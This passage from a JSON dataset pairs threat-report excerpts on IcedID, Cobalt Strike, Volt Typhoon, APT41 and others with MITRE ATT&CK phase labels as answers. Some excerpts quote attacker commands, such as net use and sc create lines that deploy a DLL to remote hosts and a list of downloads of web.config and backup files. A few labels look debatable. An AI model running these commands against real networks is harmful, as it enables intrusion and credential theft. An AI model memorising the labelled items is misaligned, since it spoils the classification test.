        "input": "Described attack activity: The threat actor gained initial access through the common malware, IcedID. The payload was delivered within an ISO file,docs_invoice_173.iso,via email, where a user opened and executed the malware. Shout out to@k3dg3for making these ISOs available. We were able to determine the user mounted the ISO using the Event ID12in Microsoft-Windows-VHDMP-Operational.evtx as shown below:\nWhen mounted, the ISO contained two files:\ndocument.lnk \ndar.dll(hidden attribute enabled)\nTypical end user perspective after opening the ISO file:\nThe filedocument.lnkis a shortcut or lnk file anddar.dllwas the IcedID payload.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: CISA currently has no evidence of data exfiltration from this threat actor but assesses that it was likely due to the use of 7-Zip and viewing of sensitive documents. ",
        "output": "exfiltration",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor usedRestic, to exfiltrate directories directly from a file server. Below are the commands used by the threat actor to initiate the backup repository and exfiltrate the data:\nThe threat actor exfiltrated the data over HTTP to server hosted on 195.123.226[.]84 . The different parameters used by the threat actor are:\n\"-r rest\": The -r option is used to specify the location of the repository where the backup data will be stored, this can be anything from an S3 bucket to a SFTP server. In this case, the Threat Actor used a REST server. \n\"password-file\": This option grabs the backup password from a file, in this case ppp.txt \n\"use-fs-snapshot\": This option will use the Windows' Volume Shadow Copy Service (VSS) for creating backups. Restic, according the the documentation, will transparently create a VSS snapshot for each volume that contains files to backup. Files are read from the VSS snapshot instead of the regular filesystem. This allows to backup files that are exclusively locked by another process during the backup. \n\"verbose\": This option is used to print a live status of the backup or the processed files.\nThe traffic related to this activity triggered the following Suricata alert: ET USER_AGENTS Go HTTP Client User-Agent . Investigating the Suricata EVE flow logs would reveal the usage of Restic thanks to the Content-Type HTTP header:",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Two hours post initial access the threat actors began lateral movement to one of the domain controllers using PowerShell, which was executed via a remote service, which launched Cobalt Strike\nReviewing the PowerShell script we can extract the shellcode and run it through scdbg to find the pipe used by the beacon.\nThanks to0xtornadoand@mattnotmaxfor this recipe!\nThe threat actors also used SMB beacons executed by remote services as well. We saw this across most machines in the domain.\nThe threat actors also used RDP to login to multiple machines within the domain.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Reconnaissance is implemented in the first part of the BlueKeep plugin, which scans the network for hosts vulnerable to the BlueKeep vulnerability. ",
        "output": "other",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Targeted attacks are now an established part of the threat landscape, so it's no surprise to see such attacks feature in our yearly review. Last year, in our security forecast, we outlined what we saw as the likely future APT developments. \nhttps://securelist.com/kaspersky-security-bulletin-2015-top-security-stories/72886/ \nThe merger of cybercrime and APT Fragmentation of bigger APT groups Evolving malware techniques New methods of data exfiltration APT arms race \nHere are the major APT campaigns that we reported this year. \nCarbanak combined cybercrime \u2013 in this case, stealing money from financial institutions \u2013 with the infiltration techniques typical of a targeted attack. The campaign was uncovered in spring 2015: Kaspersky Lab was invited to conduct a forensic investigation of a bank's systems after some of its ATMs started to dispense cash 'randomly'. It turned out that the bank was infected. Carbanak is a backdoor designed to carry out espionage, data exfiltration and remote control of infected computers. The attackers used APT-style methods to compromise their victims \u2013 sending spearphishing e-mails to bank employees. Once installed on a bank's computer, the attackers carried out reconnaissance to identify systems related to processing, accounting and ATMs and simply mimicked the activities of legitimate employees. Carbanak used three methods to steal money: (1) dispensing cash from ATMs, (2) transferring money to cybercriminals using the SWIFT network and (3) creating fake accounts and using mule services to collect the money. The attackers targeted around 100 financial institutions, with total losses amounting to almost $\\$1$ billion. \nOne of most talked-about news stories of Q1 2015 surrounded the Equation cyber-espionage group. The attackers behind Equation successfully infected the computers of thousands of victims in Iran, ps://securelist.com/kaspersky-security-bulletin-2015-top-security-stories/72886/ \nRussia, Syria, Afghanistan, the United States and elsewhere \u2013 victims included government and diplomatic institutions, telecommunications companies and energy firms. This is one of the most sophisticated APT campaigns we've seen: one of the many modules developed by the group modifies the firmware of hard drives \u2013 providing a level of stealth and persistence beyond other targeted attacks. It's clear that development of the code stretches back to 2001 or earlier. It's also related to other notorious attacks, Stuxnet and Flame \u2013 for example, its arsenal included two zero-day vulnerabilities that were later to be used in Stuxnet. \nWhile investigating an incident in the Middle East, we uncovered the activity of a previously unknown group conducting targeted attacks. Desert Falcons is the first Arabic-speaking group that has been seen conducting full-scale cyber-espionage operations \u2013 apparently connected with the political situation in the region. The first signs of this campaign date back to 2011. The first infections took place in 2013, although the peak of activity was in late 2014 and early 2015. The group has stolen over 1 million files from more than 3,000 victims. The victims include political activists and leaders, government and military organizations, mass media and financial institutions \u2013 located primarily in Palestine, Egypt, Israel and Jordan. It's clear that members of the Desert Falcons group aren't beginners: they developed Windows and Android malware from scratch, and skillfully organized attacks that relied on phishing e-mails, fake web sites and fake social network accounts. ",
        "output": "other",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: For lateral movement, Volt Typhoon actors have been observed predominantly employing RDP with compromised valid administrator credentials. Note: With a full on-premises Microsoft Active Directory identity compromise (see the Credential Access section), the group may be capable of using other methods such as Pass the Hash or Pass the Ticket for lateral movement [T1550]. \nIn one confirmed compromise of a Water and Wastewater Systems Sector entity, after obtaining initial access, Volt Typhoon actors connected to the network via a VPN with administrator credentials they obtained and opened an RDP session with the same credentials to move laterally. Over a nine-month period, they moved laterally to a file server, a domain controller, an Oracle Management Server (OMS), and a VMware vCenter server. The actors obtained domain credentials from the domain controller and performed discovery, collection, and exfiltration on the file server (see the Discovery and Collection and Exfiltration sections). \nVolt Typhoon's movement to the vCenter server was likely strategic for pre-positioning to OT assets. The vCenter server was adjacent to OT assets, and Volt Typhoon actors were observed interacting with the PuTTY application on the server by enumerating existing stored sessions. With this \ninformation, Volt Typhoon potentially had access to a range of critical PuTTY profiles, including those for water treatment plants, water wells, an electrical substation, OT systems, and network security devices. This would enable them to access these critical systems [T1563]. See Figure 2. \nAdditionally, Volt Typhoon actors have been observed using PSExec to execute remote processes, including the automated acceptance of the end-user license agreement (EULA) through an administrative account, signified by the accepteula command flag. \nVolt Typhoon actors may have attempted to move laterally to a cloud environment in one victim's network but direct attribution to the Volt Typhoon group was inconclusive. During the period of the their known network presence, there were anomalous login attempts to an Azure tenant [T1021.007] potentially using credentials [T1078.004] previously compromised from theft of NTDS.dit. These attempts, coupled with misconfigured virtual machines with open RDP ports, suggested a potential for cloud-based lateral movement. However, subsequent investigations, including password changes and multifactor authentication (MFA) implementations, revealed authentication failures from nonassociated IP addresses, with no definitive link to Volt Typhoon. ",
        "output": "lateral movement",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: With exfiltration achieved, the threat actor proceeded to the impact stage. First, they changed the administrator account's password, and one hour later, they started deploying ransomware.\nAs can be seen in the following process creation logs, the ransomware was executed both from the beacons, as well as interactively by opening the command interpreter (cmd.exe). Once critical systems encrypted, the threat actor completed their impact with a final network share encryption (-network-only).\nTo avoid analysis by threat intelligence companies should the sample leak online, the ransomware executable requires credentials for their chat to be provided through the command line argument-u.\nAs part of the encryption, the ransomware inhibits system recovery by deleting all shadow copies and altering boot settings.\nOnce encrypted, the ransom note is written toC:\\Users\\Default\\HOW_TO_DECRYPT.txtwhich, when accessed, reveals the ransomware operation to be thenow-seizedHive.\nTo achieve domain-wide impact, the threat actor attempted to deploy a Group Policy Object (GPO). The creation of this GPO can be observed by the usage ofgpme.msc(Group Policy Management Editor).\nFile creation events highlight how, for the newly created group policy, the threat actor created a scheduled task within the user configuration. This scheduled task was intended to execute the ransomware from a network share on a daily basis. This setting, however, failed to deploy the ransomware domain-wide as such a scheduled taskshould be defined within the machine configurationinstead. This resulted in only successful encryption on the hosts where the threat actor manually ran the ransomware.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In order to pose as recruiters, the attackers copy profiles of existing people or even construct new personas. They then either directly approach their potential victims on job-hunting and freelancing platforms or post fake job listings there. At first, the threat actors used brand new profiles and would simply send links to malicious GitHub projects via LinkedIn to their intended targets. Later, they started using profiles that appear established, with many followers and connections, to look more trustworthy, and branched out to more job-hunting and code-hosting websites. While some of these profiles are set up by the attackers themselves, others are potentially compromised profiles of real people on the platform, modified by the attackers.\nSome of the platforms where these interactions occur are generic job-hunting ones, while others focus primarily on cryptocurrency and blockchain projects and are thus more in line with the attackers' goals. The platforms include:\nLinkedIn, \nUpwork, \nFreelancer.com, \nWe Work Remotely, \nMoonlight, and \nCrypto Jobs List.\nThe most commonly observed compromise vector consists of the fake recruiter providing the victim with a trojanized project under the guise of a hiring challenge or helping the \"recruiter\" fix a bug for a financial reward.\nVictims receive the project files either directly via file transfer on the site or through a link to a repository like GitHub, GitLab, or Bitbucket. They are asked to download the files, add features or fix bugs, and report back to the recruiter. Additionally, they are instructed to build and execute the project in order to test it, which is where the initial compromise happens. The repositories used are usually private, so the victim is first asked to provide their account ID or email address to be granted access to them, most likely to conceal the malicious activity from researchers.\nDespite that, we observed many cases where these repositories were publicly available, but realized that these belong mostly to victims who, after completing their tasks, uploaded them to their own repositories. Figure 3 shows an example of a trojanized project hosted on GitHub. We have reported all observed malicious code to the affected services.\nThe trojanized projects fall into one of four categories:\nhiring challenges, \ncryptocurrency projects, \ngames (usually with blockchain functionality), and \ngambling with blockchain/cryptocurrency features.\nThese repositories are often duplicates of existing open-source projects or demos, with little to no change aside from adding the malicious code and changing the README file. Some of the malicious project names and names of attacker-controlled accounts operating them (where we could assess them) are listed in Table 1.\nTable 1. Observed project names and repository/commit authors\nWe also observed the attackers impersonating existing projects and companies by using similar names or appendingLLC,Ag, orInc(abbreviations of legal company types) to the names, as seen in Table 2.\nTable 2. Observed project names and repository/commit authors impersonating legitimate projects\nThe attackers often use a clever trick to hide their malicious code: they place it in an otherwise benign component of the project, usually within backend code unrelated to the task given to the developer, where they append it as a single line behind a long comment. This way, it is moved off-screen and stays hidden unless the victim scrolls to it or has the word wrap feature of their code editor enabled. Interestingly, GitHub's own code editor does not enable word wrap, so the malicious code is easy to miss even when looking at code in the repository, as shown in Figure 4.\nAnother compromise vector we observed consisted of the fake recruiter inviting the victim to a job interview using an online conferencing platform and providing a link to a website from which the necessary conferencing software can be downloaded. The website is usually a clone of an existing conferencing platform's website, as seen in Figure 5, and the downloaded software contains the first stage of the malware.",
        "output": "initial access",
        "source": "Weblive"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We were unable to confirm the arrival vectors used in the attacks, as our analysis started years after the victims were first compromised.Multiple tools were used in the lateral movement stage. Various utilities were used to scan the victims' infrastructures and deploy malware, including NBTSCAN, LADON, FRPC, WMIHACKER and ICMPinger. They also deployed a keylogger, KMLOG, to steal credentials from victims.\nTo survey the victims' infrastructures, the threat actors used a tool named ICMPinger to scan the hosts. It is a simple network scanning tool based on the ICMP protocol to test if the specified hosts are still alive. They delete this tool once their operations conclude.\nThey also used another open-source tool calledLadonto inspect the infrastructure. To bypass detection, Ladon is wrapped in a reflective loader compiled by PyInstaller. The XOR keys used to decode the payload differ among all the samples we've collected.\nTo move laterally, they also used another open-source tool calledWMIHACKER, which  could execute commands over port 135 without the need for SMB.\nIn some of the cases we observed, they also execute commands over the SMB protocol (such as using \"net use\") to inspect the infrastructure as well as deploy malware.\nC:\\Windows\\system32\\cmd.exe /C sc.exe -a 172.20.40.0-172.20.40.255 -t 500 -f lg.txt -c 1 -o 100 nC:\\Windows\\system32\\cmd.exe /C net use \\\\172.20.40.41\\c$ {password} /u:{user}C:\\Windows\\system32\\cmd.exe /C copy vdmsc.dll \\\\172.20.40.41\\c$\\users\\{user} \\videosC:\\Windows\\system32\\cmd.exe /C copy msv.dat \\\\172.20.40.41\\c$\\windows\\system32C:\\Windows\\system32\\cmd.exe /C sc \\\\172.20.40.41 create katech binpath= \"cmd /c start /b rundll32.exe c:\\users\\{user}\\videos\\vdmsc.dll,Init\"C:\\Windows\\system32\\cmd.exe /C sc \\\\172.20.40.41 start katechC:\\Windows\\system32\\cmd.exe /C sc \\\\172.20.40.41 delete katechC:\\Windows\\system32\\cmd.exe /C net use \\\\172.20.40.41\\c$ /del /y\nThe threat actors also tried to steal the credentials from the victims by using a custom tool called KMLOG. It's a simple keylogger that logs every keystroke to a file named \"%Appdata%\\Roaming\\Microsoft\\Windows\\Libraries\\infokey.zip.\"\nTo hide the keystroke log file, it is prepended with a fake ZIP file header (PK header). What follows the header is the real body of the logging content.\nTable 1. The structure of the keystroke logging file",
        "output": "lateral movement",
        "source": "Trendmicro"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: CISA observed the threat actor using the techniques identified in table 5 to evade detection. \nTable 5: Defensive evasion techniques ",
        "output": "defense evasion",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: IcedID establishes persistence on the compromised host using a scheduled task named '{0AC9D96E-050C-56DB-87FA-955301D93AB5}' that executes its second stage. This scheduled task was observed to be executing hourly under the initially compromised user.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The malicious Hancitor DLL in the OLE object, named \"rem.r\", was executed via rundll32.exe by passing the entry point \"ESLMJYVFM\".\nThe botnet ID and C2 were extracted usingHatching Triage:\nLater on in the intrusion, the threat actor used the following command to execute a Cobalt Strike Beacon on another machine:",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors dropped a file named bigfile.txt which they used certutil to convert to bigfile.exe which we believe is a variation of NetworkServiceExploit.exe as seen below.\nThis was used in this intrusion to run the batch file with the following command:",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We believe that the threat actors utilized an older version of the impacket Library. This is because as of May 4th, 2023,version 0.10.0 modifiedthe location where the registry hives would extract. They are now saved as temp files under C:\\Windows\\Temp directory. However, as with this case, we observed the temp files under C:\\Windows\\System32, which indicates the use of an older version of impacket.\nAfter reviewing the Security event logs for event ID 4624 and the Sysmon event logs (event ID 1 & 10) on the beachhead host, we have determined that the attackers utilized Pass-The-Hash to run commands on remote hosts as the local administrator user.\nWhen considering this evidence, the time sequence is a crucial factor. To prevent false positives, defenders can group related events together based on their time of execution. However, we have also included specific Sigma rules that are capable of identifying these execution patterns in isolation. Please refer to these rules in theDetections sectionof this report.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In one of the earliest reports from the year, we observedQbotcontinue to steal email inboxes from infected systems for use in later campaigns. This is most often observed in logs via the threat actors' removal of the temporary location of the export of the infected users inbox.\nIn a majority of our cases threat actors performed actions related to network shares however, many times these actions focused on simply finding the data and exfiltrating it. Although, in two reports last year we observed threat actors manually reviewing share data while still in the network, allowing a defender to see what data was accessed by the threat actors.\nExample fromSEO Poisoning  A Gootloader Story\nExample fromBumblebee: Round Two\nWe also observed at least one threat actor utilize archive utilities before exfiltrating data, as seen in this LSASS dump; also fromBumblebee: Round Two.",
        "output": "collection",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: This intrusion began with the execution of a malicious VBA macro embedded in a word document.\nA first look at\"Apply Form.docm\"witholevba.py, immediately highlights some suspicious behaviors.\nFirst off, the macro gets the name of the user executing the Word document and creates a directory inAppData,if it doesn't exist:\nThe malicious VBA macro then created two PowerShell scripts and one VBScript file in\"C:\\Users\\<USER>\\AppData\\Local\\Microsoft\\Windows\\Update\\\"\nWith Sysmon andFileCreateevent 11, we can see thatWINWORD.EXEsuccessfully created these files:\nThen, in order to execute the script and install persistence, a new scheduled task was registered:\nThe XML above describing the scheduled task was directly embedded in the VBA macro.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The only successful data that was exfiltrated from the environment was the archive containing the LSASS dump.\nHere you can see the threat actor using the web shell command to extract it:",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: IcedID\nIcedID registered a scheduled task for persistence, in the same manner as documented inseveralotherreports.\nThe task was registered to be executed every hour after logon as indicated respectively by the following XML tags:\nScreenConnect\nUpon installation, ScreenConnect persists across reboots with an auto-start service. This can be seen using the built-in System event logs (event ID 7045).\nShould the System event logs be unavailable (for instance if cleared by an threat actor), the service configuration is saved inside the SYSTEM registry file, which can be analyzed using Eric Zimmerman'sRegistry Explorertool, in the HKLM\\CurrentControlSet\\Services\\ location.\nAnomali Threat Research explained the parameters in theirarticle:\neas session type, can beSupport,Meeting,Access. \nyas process type, can beGuestorHost. \nhas the URI to the relay service's URI. \npas the relay service's port. \nsas a globally unique identifier for client identification. \nkas the encoded encryption key, used for identity verification. \ntas the optional session name.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1027: Obfuscated Files or Information   \nT1070: Indicator Removal on Host   \nT1070.003: Clear Command History   \nT1070.004: File Deletion   \nT1140: Deobfuscate/Decode Files or   \nInformation   \nT1202: Indirect Command Execution   \nT1218.011: Rundll32   \nT1497: Virtualization/Sandbox Evasion   \nT1497.001: System Checks   \nT1620: Reflective Code Loading ",
        "output": "defense evasion",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ProcessHacker was also dropped in the root of C:\\ and likely used to access the LSASS process. The use of utilities such as ProcessHacker would be unusual for typical users, and applications from a C:\\ root would also be suspicious in certain environments.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The reverse shell created by the payload appeared to be used to run a docker container exploit using a tool calledCDK.\nThe mount-cgroup is a module that utilizes a docker container escape exploit documented by @_fel1x:\nAdditional follow-on activity showed the threat actor uploading an additional file using a VIPER agent used for privilege escalation:\nTraitoris a tool that includes several privilege escalation exploits for Linux:",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Activity to the C2 is established via execution of the Script.ps1 and temp.ps1 files. Communication between the victim and C2 is encrypted using AES-CBC with the following Key and IV:\nFirst communication to the C2 (hxxp[:]//45[.]89[.]125[.]189/get) began on day one and beaconed in roughly 10-minute increments. All requests return a 502 Bad Gateway error until day two.\nFirst C2 communication breakdown:\nAES encrypted PowerShell command example:\nSafeBreach published similar findings from this C2 infrastructure, where they described the format in detail. You can review their researchhere.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The Hancitor malware was embedded in a macro-based Word document. This single-paged document contained a picture with instructions, attempting to lure the victim into enabling macros.\nWhen the macro was enabled, the infection chain started, and the first-stage Hancitor DLL was dropped to disk.\nReviewing the macro we can see that in sub yyy (towards the bottom) content within the document is being copied and used to create a file object by sub xxx which then is executed by the shell call to rundll32.\nLooking at the strings of the word document, we can see that there's an embedded OLE object, which appears to be a PE file.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Exfiltration Over C2 Channel  T1041 \nAt the exfiltration stage, APT41 gained access to various server configurations, backup data, and user data. The group most likely did not exfiltrate a large amount of confidential documents. \ndownload D:\\projects\\{redacted}\\web.config; download D:\\projects\\{redacted}\\css\\help.txt; download D:\\System Volume Information\\002.dat; download D:\\projects\\   \n{redacted}\\Web.config; download D:\\{redacted}\\{redacted}20210301120008.txt; download c:\\ftpcmd.dat; download c:\\AppTextFile.txt; download   \nc:\\Users\\Administrator\\Desktop\\OfcNTCer.dat; download c:\\Users\\   \n{redacted}\\Desktop\\172.16.11.103.png; download c:\\Users\\{redacted}\\Desktop\\FTP   \nbatch\\ftp_servername.bat; download c:\\Users\\{redacted}\\Desktop\\FTP batch\\[redacted].bat; download c:\\Users\\{redacted}\\Desktop\\tm remote chat.txt; download c:\\Temp\\netstat.txt; download c:\\Program Files (x86)\\Trend Micro\\OfficeScan\\PCCSRV\\Admin\\web.config; download c:\\Program Files (x86)\\Trend \nMicro\\OfficeScan\\PCCSRV\\Admin\\Utility\\SQL\\web.config; download c:\\Program Files (x86)\\Trend Micro\\OfficeScan\\PCCSRV\\Web\\web.config; download c:\\Program Files (x86)\\Trend \nMicro\\OfficeScan\\PCCSRV\\Web_OSCE\\Web_console\\HTML\\widget_old\\repository\\inc\\class ; download \nc:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\ASP.NETWebAdminFiles\\web.config; download c:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\CONFIG\\web.config; download c:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\ASP.NETWebAdminFiles\\web.config; download c:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\CONFIG\\web.config; download c:\\Windows\\WinSxS\\amd64_clientdeploymentconnectsite_31bf3856ad364e35_10.0.14393.0_none_d2443e4100c72a7c\\web.config; download c:\\Users\\{redacted}\\Desktop\\Office Scan Backup\\Private\\AosBackup.txt ",
        "output": "exfiltration",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Lateral movement is a vital component of threat actor TTPs. Once they get the lay of the land through the discovery methods we outlined above, we repeatedly see them move laterally across the network. Domain Controllers, file shares and similarly high-value servers are primary targets.\nThe number one post-exploitation framework of choice, Cobalt Strike, allows threat actors to leverage different techniques for the purpose of lateral movement.\nOther common choices for threat attackers include Remote Desktop connections, remote WMI execution of transferred binaries, and the Sysinternals tool PsExec.\n(updated 3/7/22 @ 1330 UTC)\nWMIC Lateral Movement Example (reference)\nPsexec Example (reference)",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In the course of doing research, we also managed to get hold of the following tools that the actors behind Operation Tropic Trooper used in an attack: \nHKTL_GETOS: Detects a target system's OS version. [10] \nHKTL_SHARESCAN: Performs the following: \n-pr: Scans for open ports on target systems.   \n-letmein: Scans for saved usernames and passwords on target systems.   \n-arp: Views the Address Resolution Protocol (ARP) on each target system.   \n-netview: Scans target systems for shared resources. \nHKTL_GETOS's OS-version-sniffing routine \nThese hacking tools were possibly remotely downloaded by the attackers onto infected systems. They aided in lateral movement and further intelligence gathering. Data such as credentials saved on infected systems can be stolen via Address Resolution Protocol (ARP) poisoning or main-in-the-middle (MiTM) Layer 2 and passthe-hash attacks. [1112] The stolen credentials allow attackers laterally move throughout a network. The threat actors no longer have to hack their way in, they have the ability to log in as legitimate users. \nBased on the specially crafted documents we were able to gather, Operation Tropic Trooper has been active since 2012. We have seen malware samples from 2011 that behaved the same way and used similar file markers. [13] \nThe following table provides more detailed information on Operation Tropic Trooper's downloader, TROJ_YAHOYAH. ",
        "output": "lateral movement",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor accessed multiple documents and folders from a remote file server. The SMB share was accessed through a compromised server via an AnyDesk session.\nThe lsass dump file ran remotely, was copied to the beachhead through the admin shareC$.\nAfter being copied, the file was zipped using 7za.exe (7-zip), in preparation for exfiltration.",
        "output": "collection",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1071: Application Layer ProtocolT1071.001: Web ProtocolsT1071.004: DNST1090.004: Domain FrontingT1095: Non-Application Layer ProtocolT1105: Ingress Tool TransferT1573.002: Asymmetric Cryptography \nCollection \nTo HADES and Back: UNC2165 Shifts to LOCKBIT to Evade Sanctions | Mandiant | Google Cloud Blog T1056.001: KeyloggingT1113: Screen CaptureT1115: Clipboard DataT1560: Archive Collected DataT1602.002: Network Device Configuration Dump ",
        "output": "command and control",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In this campaign, we discovered several tools used for UAC bypass in Windows 10. We will go into detail for each of them.",
        "output": "privilege escalation",
        "source": "Trendmicro"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Process Injection\nImagingDevices.exe injection into \"svchost.exe -k UnistackSvcGroup -s WpnUserService\" using NtAllocateVirtualMemoryRemoteApiCall. Several other processes were injected into as seen below:\nUAC Bypass\nThe threat actors were observed bypassing UAC viaWSResetand DelegateExecute, spawning new processes at a High integrity level.\nWhile executing this UAC bypass, the threat actors seemed to be running into some kind of trouble during execution, which required them to try the technique several times and tried to kill one of their processes from a prior attempt.\nIn addition to the WSReset UAC bypass, the threat actors tried a method using slui.exe. The data points to use of the Meterpreter implementationhere.[1]\nIndicator Removal on Host\nThe threat actors were also seen deleting a number of their tools which were previously dropped to perform various tactics:\nNamed Pipe Usage\nThroughout the intrusion, the injected Cobalt Strike Processes utilized various named pipes for inter-process communications. Many of these pipes used default Cobalt Strike pipe patterns.\nKnown Cobalt Strike pipes used:\nWe also saw the unusual named pipes coming from ImagingDevices.exe which was injected with Meterpreter below:",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: As part of the AnyDesk installation on the beachhead, a service was installed to ensure the instance became available again after a restart. The following PowerShell command was executed to download AnyDesk:\nThe Windows System event 7045 shows service creations. The details show that AnyDeskMSI.exe will be started, and the start type is set to auto, so it will run after a restart of the server.\nThe threat actor used both valid accounts and created a new account on the beachhead host. The user \"backup\" was created, given a password, and added to the local \"Administrator\" group. Sysmon event code 1 shows the commands ran to perform the activity:\nWindows Security events 4720 \"A user account was created\" and 4732 \"A member was added to security enabled local group\" show the creation of the user and then adding the user to the Administrators group. As the username does not show in the 4732 event. Make sure to compare the unique Security Identifier(SID):",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
